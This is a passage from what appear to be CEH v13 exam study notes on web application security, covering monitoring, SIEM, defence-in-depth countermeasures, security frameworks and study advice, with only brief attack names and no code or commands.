- **Cache Poisoning**: Corrupting PWA caches
- **Background Sync Abuse**: Exploiting background synchronization

### Detection and Monitoring

#### Web Application Monitoring
- **Real-time Attack Detection**: Monitor for attack patterns
- **Anomaly Detection**: Identify unusual traffic patterns
- **Log Analysis**: Analyze web server and application logs
- **User Behavior Analysis**: Detect suspicious user activities

#### Security Information and Event Management (SIEM)
- **Centralized Logging**: Collect logs from multiple sources
- **Correlation Rules**: Detect attack patterns across multiple events
- **Alerting**: Automated threat notifications
- **Forensic Analysis**: Post-incident investigation capabilities

### Comprehensive Countermeasures

#### Defense in Depth Strategy
1. **Network Security**: Firewalls, IDS/IPS, network segmentation
2. **Application Security**: Secure coding, input validation, output encoding
3. **Infrastructure Security**: Server hardening, patch management
4. **Monitoring**: Continuous security monitoring and alerting
5. **Incident Response**: Prepared response procedures

#### Security Frameworks and Standards
- **OWASP Top 10**: Common web application vulnerabilities
- **SANS Top 25**: Most dangerous software errors  
- **ISO 27001**: Information security management
- **NIST Cybersecurity Framework**: Comprehensive security framework

---
### Key Takeaways for CEH v13:

1. **Practical Knowledge**: Focus on understanding both theoretical concepts and practical implementation
2. **Tool Familiarity**: Be familiar with common penetration testing and security assessment tools
3. **Detection Skills**: Understand how to identify indicators of compromise and attack patterns
4. **Mitigation Strategies**: Know appropriate countermeasures and security controls
5. **Real-world Application**: Understand how these attacks manifest in real-world scenarios

### Study Recommendations:

- **Hands-on Practice**: Set up lab environments to practice these attacks
- **Tool Proficiency**: Gain experience with mentioned security tools
- **Current Trends**: Stay updated with emerging attack vectors and techniques
- **Documentation**: Practice documenting findings and recommendations
- **Ethical Considerations**: Always maintain ethical standards in security testing
